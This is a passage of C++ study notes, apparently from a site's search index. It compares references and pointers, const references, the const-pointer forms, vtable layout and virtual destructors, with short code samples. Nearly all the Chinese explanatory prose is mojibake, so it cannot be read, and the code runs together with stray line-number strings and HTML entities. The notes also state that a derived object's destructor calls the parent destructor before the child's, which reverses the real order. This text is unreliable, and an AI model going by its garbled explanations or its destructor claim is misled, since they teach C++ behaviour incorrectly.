åŸºæœ¬ç±»å‹å¯¹è±¡1234567891011121314151617181920#include &lt;stdio.h&gt;int main()&#123; int x = 10; //åˆå§‹åŒ– int* p = &amp;x; //æŒ‡é’ˆ int&amp; ref = x; //å¼•ç”¨ //è¿ç®— p++; //æŒ‡é’ˆ ref++; //å¼•ç”¨ //èµ‹å€¼ p = (int*)20; //æŒ‡é’ˆ ref = 20; //å¼•ç”¨ return 0;&#125; å †æ ˆåœ°å€ å­˜çš„å€¼ å¤‡æ³¨ ebp-0Ch xçš„åœ°å€ å¼•ç”¨ç±»å‹refçš„å€¼ ebp-8 xçš„åœ°å€ æŒ‡é’ˆpçš„å€¼ ebp-4 å˜é‡x intç±»å‹ï¼Œå˜é‡xçš„å€¼ æ“ä½œ æŒ‡é’ˆ å¼•ç”¨ åˆå§‹åŒ– éƒ½æ˜¯å–å˜é‡xçš„åœ°å€ éƒ½æ˜¯å–å˜é‡xçš„åœ°å€ è¿ç®— æŒ‡é’ˆpçš„å€¼++äº† å˜é‡xçš„å€¼++äº† èµ‹å€¼ æŒ‡é’ˆpçš„å€¼è¢«æ”¹äº† å˜é‡xçš„å€¼è¢«æ”¹äº† æŒ‡é’ˆæ˜¯ç‹¬ç«‹çš„ä¸ªä½“ï¼Œå¯¹æŒ‡é’ˆåšè¿ç®—å’Œèµ‹å€¼ï¼Œéƒ½æ˜¯ä¿®æ”¹æŒ‡é’ˆçš„å€¼ï¼›å¼•ç”¨ä¸æ˜¯ç‹¬ç«‹çš„ä¸ªä½“ï¼Œrefå˜é‡ä»£è¡¨ä¸äº†å®ƒè‡ªå·±ï¼Œå®ƒå­˜çš„å€¼æ°¸è¿œæ˜¯å®ƒæ‰€ä»£è¡¨å˜é‡çš„åœ°å€ï¼Œå¯¹å¼•ç”¨ç±»å‹è¿›è¡Œè¿ç®—ï¼Œèµ‹å€¼ç­‰æ“ä½œï¼Œæ“ä½œçš„å¹¶ä¸æ˜¯refå˜é‡æœ¬èº«ï¼Œè€Œæ˜¯å®ƒæ‰€ä»£ç†çš„å˜é‡çš„å€¼ï¼ˆåœ¨è¯¥ä¾‹ä¸­ä¸ºxï¼‰ï¼Œæ‰€ä»¥æˆ‘ä»¬è¯´å¼•ç”¨æ˜¯â€œå˜é‡çš„åˆ«åâ€ 123456789101112131415161718192021222324252627282930313233343536#include &lt;stdio.h&gt;class Base&#123;public: int x; int y; Base(int x, int y) &#123; this-&gt;x = x; this-&gt;y = y; &#125;&#125;;int main()&#123; Base b(1, 2); // åˆå§‹åŒ– Base* p = &amp;b; // æŒ‡é’ˆ Base&amp; ref = b; // å¼•ç”¨ // è¿ç®— p++; // æŒ‡é’ˆ // ref++; //ç¼–è¯‘ä¼šæŠ¥é”™ã€‚refæ˜¯bçš„åˆ«åï¼Œå¯¹è±¡bä¸èƒ½b++ï¼Œrefå°±ä¸èƒ½ref++ ref.x++; // correct ref.y++; // correct // èµ‹å€¼ p = (Base*)20; // æŒ‡é’ˆ // ref=20; //ç¼–è¯‘ä¼šæŠ¥é”™ã€‚refæ˜¯bçš„åˆ«åï¼Œå¯¹è±¡bä¸èƒ½b=20ï¼Œrefå°±ä¸èƒ½ref = 20 ref.x = 10; // correct ref.y = 20; // correct return 0;&#125; å£°æ˜å¼•ç”¨ç±»å‹å˜é‡å’Œåˆå§‹åŒ–é‚£è¡Œï¼Œå¼•ç”¨åƒæŒ‡é’ˆã€‚ä½†åœ¨ä½¿ç”¨å¼•ç”¨ç±»å‹å˜é‡æ—¶ï¼Œå®ƒå’Œå®ƒä»£è¡¨çš„é‚£ä¸ªå¯¹è±¡/å˜é‡ç”¨æ³•ä¸€æ ·ã€‚ éè¦åœ¨åæ±‡ç¼–ä¸­çœ‹å‡ºå¼•ç”¨å’ŒæŒ‡é’ˆçš„åŒºåˆ«ï¼Œé¦–å…ˆåˆ¤æ–­å‡ºå®ƒæ˜¯æŒ‡é’ˆæˆ–å¼•ç”¨ï¼Œç„¶åå¦‚æœçœ‹åˆ°è¿™ä¸ªå€¼é‡æ–°æŒ‡å‘äº†åˆ«çš„åœ°æ–¹ï¼Œé‚£å°±è¯´æ˜æ˜¯æŒ‡é’ˆã€‚ åœ¨é€†å‘åˆ†ææ—¶ï¼Œæ±‡ç¼–ä»£ç ä¸­åªæœ‰åœ°å€çš„æ¦‚å¿µï¼Œä¹Ÿæ²¡å¿…è¦åˆ†æŒ‡é’ˆ/å¼•ç”¨ã€‚ å°ç»“ å£°æ˜å¼•ç”¨ç±»å‹çš„å˜é‡æ—¶å¿…é¡»èµ‹åˆå§‹å€¼ï¼Œä¸”åªèƒ½æŒ‡å‘ä¸€ä¸ªå˜é‡ï¼Œâ€œä»ä¸€è€Œç»ˆâ€ â€œä»ä¸€è€Œç»ˆâ€æ˜¯å› ä¸ºä¸Šè¾¹æˆ‘ä»¬å°è¯•é€šè¿‡å¯¹å¼•ç”¨èµ‹å€¼ã€åšè¿ç®—ï¼Œå‘ç°éƒ½æ”¹å˜ä¸äº†å¼•ç”¨æœ¬èº«çš„å€¼ï¼Œæ”¹çš„éƒ½æ˜¯å¼•ç”¨æ‰€æŒ‡å‘é‚£ä¸ªå˜é‡çš„å€¼ å¯¹å¼•ç”¨èµ‹å€¼ï¼Œæ˜¯å¯¹å…¶æŒ‡å‘çš„å˜é‡èµ‹å€¼ï¼Œè€Œä¸æ˜¯ä¿®æ”¹å¼•ç”¨æœ¬èº«çš„å€¼ å¯¹å¼•ç”¨åšè¿ç®—ï¼Œå°±æ˜¯å¯¹å…¶æŒ‡å‘çš„å˜é‡åšè¿ç®—ï¼Œè€Œä¸æ˜¯å¯¹å¼•ç”¨æœ¬èº«åšè¿ç®— å¼•ç”¨å¯ä»¥ç†è§£æˆæ˜¯ç¼–è¯‘å™¨ç»´æŠ¤çš„ä¸€ä¸ªæŒ‡é’ˆï¼Œä½†å¹¶ä¸å ç”¨ç©ºé—´ æµ·å“¥æå‡ºçš„ï¼Œå¼•ç”¨å’ŒæŒ‡é’ˆåœ¨ç¼–è¯‘åï¼Œåœ¨åº•å±‚æ˜¯ä¸€æ ·çš„ï¼Œæ²¡æœ‰åŒºåˆ«ã€‚å¼•ç”¨æ˜¯ç¼–è¯‘å™¨åœ¨å¼€å‘æ—¶åšäº†é™åˆ¶ï¼Œé˜²æ­¢æ„å¤–ï¼Œå‡ºç°ä¸å®‰å…¨çš„æ“ä½œã€‚ ä¸å ç”¨ç©ºé—´æ˜¯æŒ‡ï¼Œåœ¨åæ±‡ç¼–ä¸­æ‰¾ä¸åˆ°å¼•ç”¨çš„å½±å­ï¼Œæ‰¾ä¸åˆ°åœ¨å“ªå—å†…å­˜å­˜äº†å¼•ç”¨æŒ‡å‘çš„é‚£ä¸ªåœ°å€ã€‚è€ŒæŒ‡é’ˆæ˜¯æœ‰ç©ºé—´å­˜è¿™ä¸ªæŒ‡é’ˆæŒ‡å‘çš„å†…å­˜åœ°å€ã€‚ å¼•ç”¨ç±»å‹å°±æ˜¯ä¸€ä¸ªå¼±åŒ–äº†çš„æŒ‡é’ˆï¼Œä½¿ç”¨å¼•ç”¨å¯ä»¥åƒæŒ‡é’ˆé‚£æ ·å»è®¿é—®ã€ä¿®æ”¹å¯¹è±¡çš„å†…å®¹ï¼Œä½†æ›´åŠ å®‰å…¨ã€‚ æ ¹æ®ä¸Šé¢çš„å°ç»“ï¼ŒçŒœæµ‹Cppä¸ºä»€ä¹ˆå‘æ˜äº†å¼•ç”¨ç±»å‹ï¼šæŒ‡é’ˆè¿‡äºå¼ºå¤§ï¼Œå¯¹äºæ–°æ‰‹ï¼Œå¦‚æœä¸èƒ½ç†Ÿç»ƒåœ°é©¾é©­æŒ‡é’ˆï¼Œä½¿ç”¨æ—¶å®¹æ˜“å‡ºé”™ï¼Œå‡ºç°ä¸å®‰å…¨çš„è¡Œä¸ºï¼ˆè¯»åˆ°ä¸è¯¥è¯»çš„å†…å®¹ï¼Œç¨‹åºå´©æºƒï¼‰ã€‚äºæ˜¯Cppæå‡ºäº†ä¸€ä¸ªâ€œå¼±åŒ–çš„æŒ‡é’ˆâ€ï¼Œå‘æ˜äº†å¼•ç”¨ç±»å‹ï¼Œå¼•ç”¨ç±»å‹ä¿ç•™äº†æŒ‡é’ˆçš„ä¼˜ç‚¹ï¼ˆé€šè¿‡å®ƒå°±èƒ½è¯»/ä¿®æ”¹æŒ‡å‘å˜é‡/å¯¹è±¡çš„å€¼ï¼‰ï¼ŒåŒæ—¶å¢åŠ äº†é™åˆ¶ï¼Œè®©å¼•ç”¨ä¸èƒ½è¢«äºŒæ¬¡èµ‹å€¼ï¼ˆé˜²æ­¢ä¹±æŒ‡ï¼‰ï¼Œä¸èƒ½åšè¿ç®—ï¼Œè¿™æ ·é¿å…äº†åƒä½¿ç”¨æŒ‡é’ˆæ—¶å‡ºç°çš„é”™è¯¯ã€‚ GPT4å†™çš„å…³äºå¼•ç”¨å’ŒæŒ‡é’ˆçš„åŒºåˆ«ï¼Œå†™å¾—è¿˜å¯ä»¥C++ä¸­çš„å¼•ç”¨ï¼ˆ&amp;ï¼‰æ˜¯ä¸€ä¸ªåˆ«åï¼Œå®ƒå¿…é¡»åœ¨å£°æ˜æ—¶å°±åˆå§‹åŒ–ï¼Œå¹¶ä¸”ä¸€æ—¦ç»‘å®šåˆ°ä¸€ä¸ªå¯¹è±¡ï¼Œå°±ä¸èƒ½å†ç»‘å®šåˆ°å¦ä¸€ä¸ªå¯¹è±¡ã€‚å¼•ç”¨ä¸æ˜¯ä¸€ä¸ªå¯ä»¥å­˜å‚¨åœ°å€çš„å˜é‡ï¼Œè€Œæ˜¯è¢«å¼•ç”¨çš„å˜é‡çš„ä¸€ä¸ªåˆ«åã€‚123int a = 10;int&amp; ref = a; // refæ˜¯å˜é‡açš„å¼•ç”¨ï¼Œä¹‹åä¸èƒ½å†è®©refå¼•ç”¨å…¶ä»–å˜é‡// int&amp; ref2; // é”™è¯¯ï¼šå¼•ç”¨å¿…é¡»åœ¨å£°æ˜æ—¶åˆå§‹åŒ–C++ä¸­çš„æŒ‡é’ˆæ˜¯ä¸€ä¸ªå˜é‡ï¼Œå®ƒå­˜å‚¨å¦ä¸€ä¸ªå˜é‡çš„åœ°å€ï¼Œå¹¶ä¸”å¯ä»¥åœ¨å…¶ç”Ÿå‘½å‘¨æœŸå†…æ”¹å˜æ‰€æŒ‡å‘çš„å¯¹è±¡ã€‚123int a = 10;int* ptr = &amp;a; // ptræ˜¯ä¸€ä¸ªæŒ‡å‘intçš„æŒ‡é’ˆï¼Œå¯ä»¥æ”¹å˜æŒ‡å‘ptr++; // åˆæ³•æ“ä½œï¼ŒæŒ‡é’ˆç§»åŠ¨åˆ°ä¸‹ä¸€ä¸ªintçš„åœ°å€ï¼ˆå¦‚æœæœ‰çš„è¯ï¼‰ä¸ªäººç†è§£ï¼šC++å¼•ç”¨æœ¬è´¨æ˜¯æŒ‡é’ˆå¸¸é‡ï¼ˆConstant Pointerï¼‰&amp;å…¶å®æ˜¯æŒ‡é’ˆå¸¸é‡ï¼ˆConstant Pointerï¼‰ï¼Œä¸ºäº†è®©ä»£ç å°‘ç‚¹*ã€‚ç„¶åä½¿ç”¨å¼•ç”¨æ—¶ï¼Œç­‰ä»·åƒæŒ‡é’ˆç±»å‹å˜é‡å¸¦ä¸Šè§£å¼•ç”¨ç¬¦*pä¸‹é¢ç”¨æŒ‡é’ˆå¸¸é‡ï¼ˆConstant Pointerï¼‰æ¨¡æ‹Ÿå®ç°å¼•ç”¨è¡Œä¸ºï¼Œå¯ä»¥çœ‹åˆ°å¼•ç”¨çš„å†™æ³•æ›´ç›´æ¥ï¼Œè¯­æ³•æ›´é—´æ¥ï¼Œä¸ä¼šå‡ºç°æŒ‡é’ˆçš„*å·ï¼Œå’Œï¼Œè§£å¼•ç”¨æ“ä½œç¬¦*æŒ‡é’ˆå¸¸é‡å¼•ç”¨1234567891011121314#include &lt;iostream&gt;void increment(int* const ptr) // ptræ˜¯ä¸€ä¸ªæŒ‡é’ˆå¸¸é‡&#123; (*ptr)++; // å¯ä»¥é€šè¿‡pträ¿®æ”¹å®ƒæ‰€æŒ‡å‘çš„å€¼&#125;int main() &#123; int value = 5; increment(&amp;value); // ä¼ é€’valueçš„åœ°å€ç»™å‡½æ•° std::cout &lt;&lt; value &lt;&lt; std::endl; // è¾“å‡ºç»“æœå°†æ˜¯6 return 0;&#125;1234567891011121314#include &lt;iostream&gt;void increment(int&amp; ref) // refæ˜¯valueçš„å¼•ç”¨&#123; ref++; // ç›´æ¥é€šè¿‡refä¿®æ”¹valueçš„å€¼&#125;int main() &#123; int value = 5; increment(value); // ä¼ é€’valueçš„å¼•ç”¨ç»™å‡½æ•° std::cout &lt;&lt; value &lt;&lt; std::endl; // è¾“å‡ºç»“æœå°†æ˜¯6 return 0;&#125;æŒ‡é’ˆå¸¸é‡ï¼ˆConstant Pointerï¼‰ï¼šæŒ‡é’ˆæœ¬èº«çš„å€¼ä¸èƒ½è¢«ä¿®æ”¹ï¼ˆæ˜¯å¸¸é‡ï¼‰ï¼Œä¸èƒ½æŒ‡å‘åˆ«çš„åœ°å€ï¼Œä½†å¯ä»¥é€šè¿‡æŒ‡é’ˆä¿®æ”¹å®ƒæŒ‡å‘çš„å€¼ã€‚12345int value = 10;int anotherValue = 20;int* const ptr = &amp;value; // ptræ˜¯ä¸€ä¸ªæŒ‡å‘intçš„constæŒ‡é’ˆï¼Œpträ¸èƒ½æŒ‡å‘åˆ«çš„åœ°å€*ptr = 15; // æ­£ç¡®ï¼šå¯ä»¥ä¿®æ”¹ptræŒ‡å‘çš„å€¼// ptr = &amp;anotherValue; // é”™è¯¯ï¼šä¸èƒ½æ”¹å˜ptrçš„æŒ‡å‘è¿˜æ˜¯å°†å¼•ç”¨è®°ä¸ºâ€œå¼±åŒ–ç‰ˆçš„æŒ‡é’ˆâ€ï¼Œå¼•ç”¨å°±æ˜¯å˜é‡çš„åˆ«åè€Œjavaä¸­å¼•ç”¨ç±»å‹çš„å¼•ç”¨ï¼Œç±»ä¼¼Cppçš„æŒ‡é’ˆï¼Œå¯ä»¥é‡æ–°èµ‹å€¼ï¼ŒæŒ‡å‘ä¸åŒçš„å¯¹è±¡ï¼Œä½†æ²¡æœ‰æŒ‡é’ˆè¿ç®—ï¼Œä¹Ÿæ²¡æœ‰ç›´æ¥çš„å†…å­˜åœ°å€è®¿é—®ã€‚å’ŒC++å¼•ç”¨ä¸åŒå°±æ˜¯javaçš„å¼•ç”¨å¯ä»¥é‡æ–°èµ‹å€¼ï¼ŒæŒ‡å‘ä¸åŒçš„å¯¹è±¡æ˜¯å¦æœ‰æŒ‡é’ˆè¿ç®—æ˜¯å¦æœ‰ç›´æ¥çš„å†…å­˜åœ°å€è®¿é—®ï¼ˆ*pï¼‰æ˜¯å¦èƒ½é‡æ–°æŒ‡å‘å¦ä¸€ä¸ªå¯¹è±¡å¤‡æ³¨C++æŒ‡é’ˆâˆšâˆšâˆšC++å¼•ç”¨Ã—Ã—Ã—å°±æ˜¯å˜é‡/å¯¹è±¡çš„åˆ«åJavaå¼•ç”¨Ã—Ã—âˆš å¼•ç”¨ç±»å‹ä½œä¸ºå‡½æ•°å‚æ•° åŸºæœ¬ç±»å‹å¯¹è±¡1234567891011121314#include &lt;stdio.h&gt;void Plus(int&amp; i)&#123; i++;&#125;int main()&#123; int i = 10; Plus(i); printf(&quot;%d &quot;, i); return 0;&#125; ä¼ çš„æ˜¯å˜é‡çš„åœ°å€ï¼Œæ‰€ä»¥åœ¨Plusä¸­ä¼šä¿®æ”¹åˆ°içš„å€¼ï¼Œè€Œä¸æ˜¯å‰¯æœ¬ 123456789101112131415161718192021222324252627282930313233#include &lt;stdio.h&gt;class Base&#123;public: int x; int y; Base(int a, int b) &#123; this-&gt;x = a; this-&gt;y = b; &#125;&#125;;void PrintByRef(Base&amp; ref, Base* p)&#123; // æŒ‡é’ˆ printf(&quot;%d %d &quot;, p-&gt;x, p-&gt;y); // å¼•ç”¨ printf(&quot;%d %d &quot;, ref.x, ref.y); //æŒ‡é’ˆå¯ä»¥é‡æ–°èµ‹å€¼ï¼Œåšè¿ç®— //è€Œå¯¹å¼•ç”¨é‡æ–°èµ‹å€¼ï¼Œåšè¿ç®—ï¼Œæ˜¯å¯¹å®ƒä»£è¡¨çš„é‚£ä¸ªå¯¹è±¡é‡æ–°èµ‹å€¼ï¼Œåšè¿ç®—&#125;int main()&#123; Base b(1, 2); PrintByRef(b, &amp;b); return 0;&#125; åæ±‡ç¼–çœ‹åˆ°è°ƒç”¨PrintByRefå‹æ ˆä¼ å‚ï¼Œå‡½æ•°å†…éƒ¨è¯»å–å¯¹è±¡xå’Œyçš„åæ±‡ç¼–ä»£ç æ˜¯ä¸€æ ·çš„ã€‚ ä½†æŒ‡é’ˆå’Œå¼•ç”¨è¿˜æ˜¯æœ‰ä¸ä¸€æ ·çš„åœ°æ–¹ï¼šæŒ‡é’ˆå¯ä»¥é‡æ–°èµ‹å€¼ï¼Œåšè¿ç®—ï¼›è€Œå¯¹å¼•ç”¨é‡æ–°èµ‹å€¼ï¼Œåšè¿ç®—ï¼Œæ˜¯å¯¹å®ƒä»£è¡¨çš„é‚£ä¸ªå¯¹è±¡é‡æ–°èµ‹å€¼ï¼Œåšè¿ç®—ã€‚ ç”¨å¯¹è±¡ç±»å‹å¼•ç”¨æŒ‡å‘åŸºæœ¬ç±»å‹çš„å˜é‡ æ­£å¸¸å¼•ç”¨ç”¨æ³•ï¼š 1234567// åŸºæœ¬ç±»å‹int x = 10;int&amp; ref1 = x;// ç±»Base b(1, 2);Base&amp; ref2 = b; intç±»å‹çš„å¯¹è±¡ï¼Œä½†æ˜¯ç”¨Baseç±»å‹ç»™äººå®¶èµ·åˆ«åï¼š 123456789101112131415161718192021#include &lt;stdio.h&gt;class Base&#123;public: int x; int y;&#125;;int main()&#123; // åŸºæœ¬ç±»å‹ int x = 10; //Base&amp; ref=x; //ç¼–è¯‘ä¸è¿‡å»ï¼Œé‚£æˆ‘ç”¨ä¸‹é¢ä¸€è¡Œï¼Œä¸Šå¼ºè½¬ Base&amp; ref=(Base&amp;)x; ref++; //ç¼–è¯‘æŠ¥é”™ï¼Œå—åˆ°é™åˆ¶ return 0;&#125; å¦‚æœç”¨int&amp; ref=xèµ·åˆ«åï¼Œrefä»£è¡¨åŸºæœ¬ç±»å‹xï¼Œæ˜¯å¯ä»¥ref++çš„ã€‚é™åˆ¶åè€Œç”¨Base&amp;ç»™äººå®¶èµ·åˆ«åï¼ŒåŠ ä¸Šå¼ºè½¬ï¼Œåˆ«åæ˜¯èµ·äº†ï¼Œä½†æ˜¯ä½¿ç”¨æ—¶å—åˆ°é™åˆ¶ï¼Œè¿™æ ·æ¯«æ— æ„ä¹‰ã€‚ å°ç»“ äººå®¶åŸæ¥æ˜¯ä»€ä¹ˆç±»å‹çš„ï¼Œå°±ç”¨ä»€ä¹ˆç±»å‹çš„å¼•ç”¨ç»™äººå®¶èµ·åˆ«åï¼Œè¿™æ ·æ‰æœ‰æ„ä¹‰ã€‚ å¸¸å¼•ç”¨ è¡¨æ˜è¯¥å¼•ç”¨åªè¯»ï¼Œä¸èƒ½é€šè¿‡è¿™ä¸ªå¼•ç”¨æ¥ä¿®æ”¹å®ƒæŒ‡å‘çš„å˜é‡/å¯¹è±¡çš„å€¼ ç”¨é€”ï¼š è¡¨æ˜å¼•ç”¨åœ¨è¿™ä¸ªå‡½æ•°ä¸­ä¸ä¼šä¿®æ”¹æŒ‡å‘çš„å˜é‡/å¯¹è±¡çš„å€¼ è®©ç¼–è¯‘å™¨å¸®åŠ©æ£€æŸ¥ä»£ç æ˜¯å¦è¿åäº†const 1234567891011121314151617181920#include &lt;stdio.h&gt;class Base&#123;public: int x;&#125;;void Print(const Base&amp; ref)&#123; ref.x = 200; //ç¼–è¯‘å™¨ä¼šæŠ¥é”™ printf(&quot;%d &quot;, ref.x);&#125;int main()&#123; Base b; b.x = 100; return 0;&#125; å¤ä¹ ï¼šconst+æŒ‡é’ˆå¸¸é‡æŒ‡é’ˆï¼ˆPointer to Constantï¼‰ï¼ˆå…¶è‹±æ–‡è¡¨è¾¾æ˜¯ â€œpointer to constâ€ æˆ– â€œconst pointerâ€ï¼Œä½†ä¸ºäº†é¿å…æ··æ·†ï¼Œé€šå¸¸ä¸ç§°å…¶ä¸º â€œconst pointerâ€ï¼Œå› ä¸ºè¿™ä¸ªè¡¨è¾¾å¯èƒ½ä¼šè¢«è¯¯è§£ä¸ºæŒ‡é’ˆå¸¸é‡ã€‚ï¼‰æŒ‡é’ˆæŒ‡å‘çš„æ•°æ®ä¸èƒ½è¢«ä¿®æ”¹ï¼ˆå¸¸é‡ï¼‰ï¼Œä¸èƒ½é€šè¿‡æŒ‡é’ˆä¿®æ”¹å®ƒæŒ‡å‘çš„å€¼ï¼Œä½†æŒ‡é’ˆæœ¬èº«å¯ä»¥ä¿®æ”¹ï¼ŒæŒ‡å‘åˆ«çš„åœ°å€ã€‚12345int value = 10;int anotherValue = 20;const int* ptr = &amp;value; // ptræŒ‡å‘ä¸€ä¸ªconst intï¼Œä¸èƒ½é€šè¿‡pträ¿®æ”¹valueçš„å€¼// *ptr = 15; // é”™è¯¯ï¼šä¸èƒ½ä¿®æ”¹ptræŒ‡å‘çš„å€¼ptr = &amp;anotherValue; // æ­£ç¡®ï¼šptrå¯ä»¥æŒ‡å‘å¦ä¸€ä¸ªåœ°å€æŒ‡é’ˆå¸¸é‡ï¼ˆConstant Pointerï¼‰æŒ‡é’ˆæœ¬èº«çš„å€¼ä¸èƒ½è¢«ä¿®æ”¹ï¼ˆæ˜¯å¸¸é‡ï¼‰ï¼Œä¸èƒ½æŒ‡å‘åˆ«çš„åœ°å€ï¼Œä½†å¯ä»¥é€šè¿‡æŒ‡é’ˆä¿®æ”¹å®ƒæŒ‡å‘çš„å€¼ã€‚12345int value = 10;int anotherValue = 20;int* const ptr = &amp;value; // ptræ˜¯ä¸€ä¸ªæŒ‡å‘intçš„constæŒ‡é’ˆï¼Œpträ¸èƒ½æŒ‡å‘åˆ«çš„åœ°å€*ptr = 15; // æ­£ç¡®ï¼šå¯ä»¥ä¿®æ”¹ptræŒ‡å‘çš„å€¼// ptr = &amp;anotherValue; // é”™è¯¯ï¼šä¸èƒ½æ”¹å˜ptrçš„æŒ‡å‘å¸¸é‡æŒ‡é’ˆå¸¸é‡ï¼ˆConstant Pointer to Constantï¼‰å¦‚æœæ—¢ä¸å¸Œæœ›æŒ‡é’ˆæ”¹å˜æŒ‡å‘ï¼Œä¹Ÿä¸å¸Œæœ›é€šè¿‡æŒ‡é’ˆä¿®æ”¹æŒ‡å‘çš„å€¼ï¼Œå¯ä»¥åŒæ—¶ä½¿ç”¨ä¸¤ç§constã€‚12345int value = 10;int anotherValue = 20;const int* const ptr = &amp;value; // ptræ˜¯ä¸€ä¸ªæŒ‡å‘const intçš„constæŒ‡é’ˆ// *ptr = 15; // é”™è¯¯ï¼šä¸èƒ½ä¿®æ”¹ptræŒ‡å‘çš„å€¼// ptr = &amp;anotherValue; // é”™è¯¯ï¼šä¸èƒ½æ”¹å˜ptrçš„æŒ‡å‘æ€»ç»“ä¸€ä¸‹ï¼šconst int* ptr è¡¨ç¤ºæŒ‡é’ˆæŒ‡å‘çš„æ˜¯ä¸€ä¸ªå¸¸é‡æ•´æ•°ï¼Œä¸èƒ½é€šè¿‡æŒ‡é’ˆæ¥ä¿®æ”¹å®ƒæŒ‡å‘çš„å†…å®¹ï¼Œä½†æŒ‡é’ˆæœ¬èº«å¯ä»¥æ”¹å˜ï¼ŒæŒ‡å‘å…¶ä»–çš„intå˜é‡ã€‚int* const ptr è¡¨ç¤ºæŒ‡é’ˆæœ¬èº«æ˜¯å¸¸é‡ï¼Œä¸èƒ½æŒ‡å‘å…¶ä»–çš„åœ°å€ï¼Œä½†å¯ä»¥é€šè¿‡æŒ‡é’ˆæ¥ä¿®æ”¹å®ƒæ‰€æŒ‡å‘çš„æ•´æ•°çš„å€¼ã€‚const int* const ptr è¡¨ç¤ºæŒ‡é’ˆæœ¬èº«æ˜¯å¸¸é‡ï¼Œä¸”æŒ‡å‘çš„æ•´æ•°ä¹Ÿæ˜¯å¸¸é‡ï¼Œæ—¢ä¸èƒ½é€šè¿‡æŒ‡é’ˆä¿®æ”¹å€¼ï¼Œä¹Ÿä¸èƒ½æ”¹å˜æŒ‡é’ˆçš„æŒ‡å‘ã€‚"},{"title":"å°ç»“","path":"/wiki/C++/å°ç»“_C++.html","content":"Cppç›¸æ¯”Cï¼Œç¼–è¯‘å™¨æ›´æ™ºèƒ½äº†ï¼ŒèƒŒåå¸®ç¼–ç¨‹äººå‘˜åšäº†å¾ˆå¤šäº‹æƒ…ï¼Œç¼–ç¨‹äººå‘˜å¼€å‘æ›´é«˜æ•ˆï¼Œæ–¹ä¾¿äº†ã€‚å­¦ä¹ C++ï¼Œå°±æ˜¯å­¦ä¹ ç¼–è¯‘å™¨èƒŒååšäº†å“ªäº›äº‹æƒ…ï¼Œä¾æ­¤å†™å‡ºé«˜æ•ˆå¯é å®‰å…¨çš„ä»£ç ã€‚ OOPä¸‰å¤§ç‰¹æ€§ é¢å‘å¯¹è±¡ç›¸æ¯”äºé¢å‘è¿‡ç¨‹ä¸‰ä¸ªæœ¬è´¨çš„åŒºåˆ«ï¼šå°è£…ï¼Œç»§æ‰¿ï¼Œå¤šæ€ã€‚ å°è£…ï¼šå°†å‡½æ•°å†™åˆ°ç»“æ„ä½“ï¼ˆç±»ï¼‰ä¸­ï¼Œè®©å‡½æ•°å¯ä»¥æ–¹ä¾¿åœ°ä½¿ç”¨ç»“æ„ä½“é‡Œçš„å˜é‡ã€‚ ç»§æ‰¿ï¼šæ•°æ®çš„å¤ç”¨ï¼Œå‡å°‘é‡å¤ä»£ç çš„ç¼–å†™ privateåªæ˜¯ç¼–è¯‘å™¨ç¼–è¯‘æ—¶çš„é™åˆ¶ï¼Œprivateæˆå‘˜çš„å†…å­˜å¸ƒå±€ä¸publicæ²¡å·®åˆ«ï¼Œæƒ³è®¿é—®æ˜¯æ‹¦ä¸ä½çš„ã€‚ å¤šæ€ï¼šé—´æ¥è°ƒç”¨+è™šè¡¨ è™šè¡¨ å½“ä¸€ä¸ªç±»æœ‰è™šå‡½æ•°åï¼Œè¯¥å¯¹è±¡çš„èµ·å§‹åœ°å€å­˜æ”¾çš„æ˜¯vptræŒ‡é’ˆï¼Œéšåæ‰æ˜¯æˆå‘˜å˜é‡ã€‚vptræŒ‡å‘è™šè¡¨ï¼ˆä¸€ä¸ªå­˜æ”¾å‡½æ•°åœ°å€çš„æ•°ç»„ï¼‰ï¼Œè™šè¡¨ä¸­å­˜æ”¾ç±»ä¸­æ‰€æœ‰è™šå‡½æ•°çš„å‡½æ•°åœ°å€ï¼ˆæŒ‰è™šå‡½æ•°åœ¨ä»£ç ä¸­å£°æ˜çš„å…ˆåé¡ºåºï¼‰ã€‚ å¦‚æœå­ç±»æ²¡æœ‰å¯¹åŸºç±»å£°æ˜çš„è™šå‡½æ•°è¿›è¡Œé‡å†™ï¼ˆoverrideï¼‰ï¼Œé‚£ä¹ˆè¡¨é¡¹ä¸­çš„æ˜¯çˆ¶ç±»çš„è™šå‡½æ•°åœ°å€ã€‚å¦‚æœé‡å†™äº†ï¼Œè¿™ä¸€é¡¹åˆ™æ˜¯å­ç±»é‡å†™çš„å‡½æ•°åœ°å€ã€‚ å¯¹äºå¤šé‡ç»§æ‰¿ï¼Œè™šè¡¨çš„ä¸ªæ•°=ç»§æ‰¿çˆ¶ç±»çš„ä¸ªæ•°ã€‚å†…å­˜å¸ƒå±€å…ˆæ˜¯ç¬¬ä¸€ä¸ªçˆ¶ç±»çš„å†…å­˜ï¼Œç„¶åæ˜¯ç¬¬äºŒä¸ªçˆ¶ç±»çš„å†…å­˜ï¼Œâ€¦ï¼Œæœ€åæ‰æ˜¯å­ç±»çš„ã€‚ å­ç±»æ–°å¢çš„è™šå‡½æ•°å‡½æ•°åœ°å€æ˜¯åœ¨ç¬¬ä¸€ä¸ªè™šè¡¨ä¸­ã€‚ overrideäº†çˆ¶ç±»å“ªä¸ªçš„è™šå‡½æ•°å°±åœ¨å“ªä¸ªè¡¨ä¸­ï¼Œæ²¡æœ‰overrideå°±ä»æ˜¯çˆ¶ç±»çš„ã€‚ è™šææ„å‡½æ•° ææ„å‡½æ•°å»ºè®®å†™æˆè™šå‡½æ•°ï¼Œè®©ææ„å‡½æ•°ä¹Ÿå‘ç”Ÿå¤šæ€ï¼Œå½“ç”¨åŸºç±»ç±»å‹çš„æŒ‡é’ˆå»deleteä¸€ä¸ªæ´¾ç”Ÿç±»çš„å®ä¾‹çš„æ—¶å€™ï¼ˆdeleteçš„èƒŒåç¼–è¯‘å™¨ä¼šæ’å…¥è°ƒç”¨ææ„å‡½æ•°çš„ä»£ç ï¼‰ï¼Œå¯ä»¥æ˜¯è°ƒç”¨å­ç±»çš„ææ„å‡½æ•°å»é‡Šæ”¾å­ç±»å¯¹è±¡ï¼ˆåœ¨å­ç±»å¯¹è±¡çš„ææ„å‡½æ•°ä¸­ï¼Œä¼šå…ˆè°ƒç”¨çˆ¶ç±»ææ„å‡½æ•°ï¼Œå†è°ƒç”¨å­ç±»çš„ææ„å‡½æ•°ï¼‰ã€‚å¦åˆ™ï¼Œåªæœ‰çˆ¶ç±»çš„ææ„å‡½æ•°è¢«è°ƒç”¨ã€‚ 123456789101112class Base&#123; virtual ~Base() &#123;&#125;&#125;;class Derived : public Base&#123; ~Derived() &#123;&#125;&#125;;Base *p = new Derived();delete p; æ¨¡æ¿ 